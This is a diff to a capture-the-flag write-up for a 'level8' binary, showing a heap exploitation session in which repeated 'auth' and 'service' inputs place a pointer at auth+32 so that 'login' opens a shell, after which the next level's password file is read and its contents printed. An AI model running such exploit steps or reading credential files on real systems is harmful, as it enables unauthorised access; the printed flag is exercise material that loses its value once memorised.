@@ -185,7 +185,6 @@ What we learned :
 We want to increase the service variable so that it writes at auth+32, therefore validating the check that memory is not equal to 0. 
 
 
-
 ```bash
 ./level8 
 auth 
@@ -197,6 +196,11 @@ Password:
 0x804a008, 0x804a018 
 service
 0x804a008, 0x804a028 
+```
+
+Here is 0x804a028 is equal to auth + 0x20, so we can try the login input. 
+
+```bash
 login
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
